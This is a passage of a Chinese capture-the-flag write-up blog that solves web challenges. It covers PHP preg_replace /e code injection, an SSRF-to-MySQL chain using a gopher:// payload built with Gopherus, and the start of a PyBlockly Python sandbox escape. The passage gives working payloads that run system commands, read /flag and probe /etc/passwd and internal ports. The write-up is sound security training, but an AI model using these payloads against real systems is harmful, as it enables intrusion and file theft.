class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#在字符串 $_POST['flag'] 中查找所有与正则表达式 /please_give_me_flag/ 匹配的部分，然后将这些匹配部分替换为 $_POST['task'] 的值。因为/e,$_POST['task']被当作 PHP 代码执行.</span>​    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"moran want a flag.&lt;/br&gt;(?moran=flag)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到<code>/e</code>知道会执行任意 PHP 代码<del>（遇到一个相同的题在第二页，所以这就不放相关了</del></p><p>还有一点要记得php版本低点<del>（是谁一开始用的7.3.4我不说</del></p><blockquote><p>在 PHP 7.0.0 及之后的版本中，<code>preg_replace</code> 函数的 <code>/e</code> 修饰符被彻底移除。如果在这些版本中使用 <code>/e</code> 修饰符，会导致 <code>E_COMPILE_ERROR</code> 错误，代码将无法正常运行。</p></blockquote><p>用<code>flag=please_Give_me_flag&amp;task=phpinfo()</code>可以先测试一下（</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/3567b2ea989c79d81cbc893d58a549ce.png"></p><p>可的（</p><p>浅贴一篇喵<a href="https://www.cnblogs.com/willingyut/p/17688487.html">绕过PHP正则表达式 - willingyut - 博客园</a></p><pre class="line-numbers language-none"><code class="language-none">task=$_POST[1]($_POST[2]);&amp;flag=Please_give_me_flag&amp;1=system&amp;2=tac /f*   //tac 则按行逆序输出文件内容task=var_dump(file_get_contents(hex2bin("2f666c6167")));&amp;flag=please_Give_me_flagflag=please_give_me_flaG&amp;task=print(file_get_contents("\x2f\x66\x6c\x61\x67"));...scandir 函数用于列出指定目录中的文件和文件夹var_dump(scandir(chr(47)));读取根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h3><p>尝试注册admin被告知用户名已存在，故想登录admin</p><p>注册一个在改密码界面改一下</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/4edce8c385acaba3b2484943f735cdae.png"></p><p><del>admin不为人知的图片竟是！</del></p><p>发现<code>/getpicture.php?url=</code></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html#SSRF-%E4%B9%8B-XXE">手把手带你用 SSRF 打穿内网 | 国光</a></p><pre class="line-numbers language-none"><code class="language-none">?url=https://www.baidu.com/robots.txtUser-agent: BaiduspiderDisallow: /baiduDisallow: /s?Disallow: /ulink?Disallow: /link?Disallow: /home/news/dataDisallow: /bh...?url=127.0.0.1&lt;!DOCTYPE html&gt;&lt;html lang="zh-CN"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在ssrf漏洞</p><pre class="line-numbers language-none"><code class="language-none">?url=file:///etc/passwd&lt;img src="data:image/jpeg;base64,bm9ub25v" width="20" alt="图片"&gt;nonono<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><del>（被狠狠拒绝了</del></p><p>探一下端口喵</p><pre class="line-numbers language-none"><code class="language-none">GET /getpicture.php?url=127.0.0.1:8080 HTTP/1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>抓到一个3306</p><pre class="line-numbers language-none"><code class="language-none">WP%^-g����lV;@m%mysql_native_password��Got packets out of order<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>mysql_native_password</code> 是 MySQL 数据库中用于用户认证的一种插件。在 MySQL 里，用户登录数据库时需要进行身份验证，而认证插件就是负责完成这个验证过程的机制。<code>mysql_native_password</code> 是 MySQL 5.7 及之前版本中默认的认证插件</p></blockquote><p>看来是默认，默认用户名是 <code>root</code></p><blockquote><p>MySQL：如果用户没有密码保护，您可以转储他的数据库，也可以将恶意文件放入他的系统中。</p></blockquote><p><a href="https://www.iamwawa.cn/urldecode.html%EF%BC%88%E6%89%80%E4%BB%A5%E8%BF%99%E4%B9%88%E4%B9%85%E4%B9%8B%E5%90%8E%E8%BF%98%E6%98%AF%E7%94%A8%E7%9D%80%E6%9C%80%E5%88%9D%E7%9A%84url%E7%BC%96%E7%A0%81%E7%BD%91%E5%9D%80%E5%90%97%E3%80%82%E3%80%82%E3%80%82">https://www.iamwawa.cn/urldecode.html（所以这么久之后还是用着最初的url编码网址吗。。。</a></p><p>一开始一直在查表查列，后来才想到flag是在文件夹里（</p><blockquote><p><code>LOAD_FILE()</code> 是 MySQL 内置的一个函数，用于读取指定路径下的文件内容并将其作为字符串返回。该函数需要有相应的文件读取权限，并且文件路径必须是绝对路径。</p><p><code>load_file</code>在渗透过程中是读取文件，<code>select load_file('/flag');</code>就是读取<code>mysql</code>配置文件，<code>flag</code>又在根目录下</p></blockquote><p><a href="https://www.cnblogs.com/Wesuiliye/p/17226511.html">mysql注入读写文件 - 0x1e61 - 博客园</a></p><p><code>./gopherus.py --exploit mysql</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/f313cb49708c893f7941b9af6321bf79.png"></p><pre class="line-numbers language-none"><code class="language-none">?url=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%251b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%256c%256f%2561%2564%255f%2566%2569%256c%2565%2528%2527%252f%2566%256c%2561%2567%2527%2529%253b%2501%2500%2500%2500%2501 flag{c8cfb052-cc9b-4b27-a9b9-b3ad7b93627b}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>mysql那端口都是3306吗？Gopher也直接给的3306</p><p><a href="https://www.cnblogs.com/Magiclala/p/15993571.html">各种常用的默认端口号 总结 - Magiclala - 博客园</a></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ca4d276d3c0239b63e831c0bebbd2aa.png"></p><p>看来确实</p><hr><h3 id="2024强网杯-PyBlockly"><a href="#2024强网杯-PyBlockly" class="headerlink" title="2024强网杯-PyBlockly"></a>2024强网杯-PyBlockly</h3><p>题目附件：</p><blockquote><p>通过百度网盘分享的文件：PyBlockly_3c0f83fae6937f4147d3bc7ae…<br>链接：<a href="https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666">https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666</a><br>提取码：6666<br>–来自百度网盘超级会员V2的分享</p></blockquote><p><a href="https://pan.baidu.com/s/1yC7afEWa1Rh1VCgIMf41Iw?pwd=6666">PyBlockly_3c0f83fae6937f4147d3bc7ae84ce3e2.zip_免费高速下载|百度网盘-分享无限制</a></p><p>网上好心人的，感谢感谢！！！</p><p><del>这下可以狠狠启动了（</del></p><p><code>python app.py</code></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7d714d37445706f30a25454cd4cf5046.png"></p><p>哈哈，挺好玩的，<del>我能玩儿一天（</del></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">import</span> re<span class="token keyword">import</span> unidecode<span class="token keyword">import</span> string<span class="token keyword">import</span> ast<span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> importlib<span class="token punctuation">.</span>util<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'JSON_AS_ASCII'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">False</span>blacklist_pattern <span class="token operator">=</span> <span class="token string">r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_`{|}~]"</span><span class="token keyword">def</span> <span class="token function">module_exists</span><span class="token punctuation">(</span>module_name<span class="token punctuation">)</span><span class="token punctuation">:</span>    spec <span class="token operator">=</span> importlib<span class="token punctuation">.</span>util<span class="token punctuation">.</span>find_spec<span class="token punctuation">(</span>module_name<span class="token punctuation">)</span>    <span class="token keyword">if</span> spec <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> module_name <span class="token keyword">in</span> sys<span class="token punctuation">.</span>builtin_module_names<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>      <span class="token keyword">if</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">:</span>        std_lib_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>__file__<span class="token punctuation">)</span>              <span class="token keyword">if</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>std_lib_path<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">not</span> spec<span class="token punctuation">.</span>origin<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">verify_secure</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token builtin">type</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">case</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">:</span>                  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ERROR: Banned module "</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>            <span class="token keyword">case</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">:</span>                 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ERROR: Banned module </span><span class="token interpolation"><span class="token punctuation">{</span>node<span class="token punctuation">.</span>module<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">check_for_blacklisted_symbols</span><span class="token punctuation">(</span>input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklist_pattern<span class="token punctuation">,</span> input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">block_to_python</span><span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token punctuation">:</span>    block_type <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span>    code <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">if</span> block_type <span class="token operator">==</span> <span class="token string">'print'</span><span class="token punctuation">:</span>        text_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>        text <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>text_block<span class="token punctuation">)</span>  <span class="token comment">#递归调用 block_to_python 函数将 text_block 转换为 Python 代码 text。</span>        code <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"print(</span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token comment">#使用了 Python 的 f-string 格式化字符串特性，其主要功能是生成一条 Python 的 print 函数调用语句</span>             <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'math_number'</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> <span class="token builtin">str</span><span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'NUM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#当块类型为 math_number 时，检查 block 字典的 fields 键下的 NUM 键对应的值是否为数字。</span><span class="token comment">#如果是数字，则将其转换为整数类型并赋值给 code；否则，将 code 置为空字符串。    </span>            code <span class="token operator">=</span>  <span class="token builtin">int</span><span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'NUM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token keyword">else</span><span class="token punctuation">:</span>            code <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'text'</span><span class="token punctuation">:</span><span class="token comment">#如果包含黑名单符号，则将 code 置为空字符串；否则，使用 unidecode 函数将该值转换为 ASCII 字符串，并添加引号，赋值给 code。</span>        <span class="token keyword">if</span> check_for_blacklisted_symbols<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            code <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>                  code <span class="token operator">=</span>  <span class="token string">"'"</span> <span class="token operator">+</span> unidecode<span class="token punctuation">.</span>unidecode<span class="token punctuation">(</span>block<span class="token punctuation">[</span><span class="token string">'fields'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'TEXT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"'"</span><span class="token comment">#函数unidecode.unidecode</span>    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'max'</span><span class="token punctuation">:</span><span class="token comment">#从 block 字典的 inputs 键下的 A 和 B 键中分别获取对应的子块信息 a_block 和 b_block。</span>              a_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>        b_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>        a <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>a_block<span class="token punctuation">)</span>          b <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>b_block<span class="token punctuation">)</span>        code <span class="token operator">=</span>  <span class="token string-interpolation"><span class="token string">f"max(</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">)"</span></span>    <span class="token keyword">elif</span> block_type <span class="token operator">==</span> <span class="token string">'min'</span><span class="token punctuation">:</span>        a_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>        b_block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'inputs'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>        a <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>a_block<span class="token punctuation">)</span>        b <span class="token operator">=</span> block_to_python<span class="token punctuation">(</span>b_block<span class="token punctuation">)</span>        code <span class="token operator">=</span>  <span class="token string-interpolation"><span class="token string">f"min(</span><span class="token interpolation"><span class="token punctuation">{</span>a<span class="token punctuation">}</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">{</span>b<span class="token punctuation">}</span></span><span class="token string">)"</span></span>    <span class="token keyword">if</span> <span class="token string">'next'</span> <span class="token keyword">in</span> block<span class="token punctuation">:</span><span class="token comment">#Blockly 中的编程块可以按顺序连接形成一个序列，每个块通过 next 字段指向序列中的下一个块。</span>              block <span class="token operator">=</span> block<span class="token punctuation">[</span><span class="token string">'next'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'block'</span><span class="token punctuation">]</span>              code <span class="token operator">+=</span><span class="token string">"\n"</span> <span class="token operator">+</span> block_to_python<span class="token punctuation">(</span>block<span class="token punctuation">)</span><span class="token operator">+</span> <span class="token string">"\n"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> code     <span class="token keyword">return</span> code<span class="token keyword">def</span> <span class="token function">json_to_python</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token punctuation">:</span>    block <span class="token operator">=</span> blockly_data<span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'blocks'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token comment">#json的blocks对象的属性blocks的数组的第一个</span>    python_code <span class="token operator">=</span> <span class="token string">""</span>    python_code <span class="token operator">+=</span> block_to_python<span class="token punctuation">(</span>block<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>          <span class="token keyword">return</span> python_code<span class="token keyword">def</span> <span class="token function">do</span><span class="token punctuation">(</span>source_code<span class="token punctuation">)</span><span class="token punctuation">:</span>    hook_code <span class="token operator">=</span> <span class="token triple-quoted-string string">'''#审计钩子audit hook绕过def my_audit_hook(event_name, arg):    blacklist = ["popen", "input", "eval", "exec", "compile", "memoryview"]    if len(event_name) &gt; 4:#不允许event_name的长度大于4        raise RuntimeError("Too Long!")    for bad in blacklist:        if bad in event_name:            raise RuntimeError("No!")__import__('sys').addaudithook(my_audit_hook)'''</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>source_code<span class="token punctuation">)</span>    code <span class="token operator">=</span> hook_code <span class="token operator">+</span> source_code    tree <span class="token operator">=</span> <span class="token builtin">compile</span><span class="token punctuation">(</span>source_code<span class="token punctuation">,</span> <span class="token string">"run.py"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>ast<span class="token punctuation">.</span>PyCF_ONLY_AST<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> verify_secure<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#AST沙箱绕过 </span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"run.py"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>code<span class="token punctuation">)</span>                  result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'python'</span><span class="token punctuation">,</span> <span class="token string">'run.py'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'run.py'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> result        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Execution aborted due to security concerns."</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'run.py'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"Timeout!"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> app<span class="token punctuation">.</span>send_static_file<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/blockly_json'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#接收了发给服务器/blockly_json路由的json</span><span class="token keyword">def</span> <span class="token function">blockly_json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    blockly_data <span class="token operator">=</span> request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token punctuation">)</span>    blockly_data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>blockly_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        python_code <span class="token operator">=</span> json_to_python<span class="token punctuation">(</span>blockly_data<span class="token punctuation">)</span><span class="token comment">#unidecode绕过</span>        <span class="token keyword">return</span> do<span class="token punctuation">(</span>python_code<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Error generating Python code"</span><span class="token punctuation">,</span> <span class="token string">"details"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>截一个print的</p><p>由于在<code>static</code>文件夹的index.html在外部引用了俩<code>js</code>文件的链接，用yakit时前端一片空白就剩个按钮（哈哈无语</p><p>自己搞一个（<del>绝对不会说自己是用ctrl c+v笨办法弄过来的</del></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./static/blockly.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>./static/jquery-3.6.0.min.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/1c4cf20d925daada432aded319d37cce.png"></p><p>化简</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">" "</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>#unidecode绕过</p><ul><li><blockquote><p><code>unidecode</code> 是一个 Python 库，<code>unidecode.unidecode()</code> 函数用于将输入的 Unicode 字符串转换为近似的 ASCII 字符串。例如，将一些带重音符号的字母转换为对应的无重音字母，将中文等非 ASCII 字符转换为合适的 ASCII 表示（可能是拼音等）。</p></blockquote></li></ul><p><del>能不能cn统治世界啊受不了天天看English了，根本看不懂</del></p><p><a href="https://segmentfault.com/a/1190000045024781">unidecode，一个神奇的 Python 库！ - Sitin - SegmentFault 思否</a></p><p><a href="https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html#google_vignette">Unicode字符表</a></p><p><a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html">pyjail bypass-02 绕过基于字符串匹配的过滤 - DumKiy’s blog</a></p><blockquote><p><code>𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗 𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻  𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡</code> 